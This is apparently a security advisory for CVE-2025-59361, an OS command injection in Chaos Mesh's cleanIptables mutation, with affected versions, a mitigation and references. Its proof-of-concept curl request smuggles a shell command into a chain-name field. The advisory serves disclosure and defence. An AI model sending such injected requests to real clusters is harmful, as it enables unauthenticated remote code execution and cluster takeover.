---
description: CVE-2025-59361, CRITICAL, OS command injection in Chaos Mesh via the cleanIptables mutation
title: Chaos Mesh cleanIptables command injection
date_published: "2025-09-15"
last_updated: "2025-09-15"
xray_id: JFSA-2025-001449536
vul_id: CVE-2025-59361
cvss: 9.8
severity: critical
discovered_by: Natan Nehorai
type: vulnerability

---

## Summary

OS command injection in Chaos Mesh via the cleanIptables mutation

## Component

github.com/chaos-mesh/chaos-mesh

## Affected versions

(,2.7.2]

## Description

The cleanIptables mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows unauthenticated in-cluster attackers to perform remote code execution across the cluster.


## PoC

```shell
curl -X POST -H "Content-Type: application/json" -d /
'{"query": "mutation CleanIptablesInPod { 
pod(ns: \"chaos-mesh\", name: \"chaos-dashboard-5c6575bd9f-b5tqg\") {
 cleanIptables(chains: [\"INPUT;touch /tmp/pwned; \", \"OUTPUT\", \"FORWARD\", \"CHAOS-MESH-INPUT\", \"CHAOS-MESH-OUTPUT\"])
 }
 }"}' http://controller-manager-host:10082/query
```



## Vulnerability Mitigations

If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:

```shell
helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
```



## References

[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)

[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)

